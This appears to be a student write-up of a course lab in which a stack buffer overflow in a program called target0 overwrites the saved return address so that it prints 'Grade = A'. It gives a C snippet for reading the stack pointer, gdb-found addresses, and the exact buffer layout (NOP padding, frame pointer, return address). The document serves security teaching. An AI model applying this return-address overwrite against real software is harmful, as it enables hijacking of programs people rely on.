# Bug Identification

For target0, we can create a buffer with a size larger than `30` to overflow `the saved EIP` to let target0 print `Grade = A` (by overwritting the address).


# Details

1. First, we use the following method to get `Stack pointer (ESP)`, which is `0xbffff874`.

```
#include <stdio.h>
unsigned long get_sp(void)
{
        __asm__("movl %esp, %eax");
}
int main()
{
        printf("Stack pointer (ESP): 0x%x\n", get_sp() );
}
```

2. Make a buffer with a size of `30` to run target0, and use gdb to find the address for the statement grade = 'A' (`0x0804851d`).

3. The final buffer we create is a buffer with a size of 39 (30 buf + 4 stp + 4 ret addr + 1 null terminate). The structure of the buffer is `[(multiple)0x90][stp][ret addr][null terminate]`. Here, `[stp]` is `0xbffff874`; `[ret addr]` is `0x0804851d`; `[null terminate]` = `"\x00"`.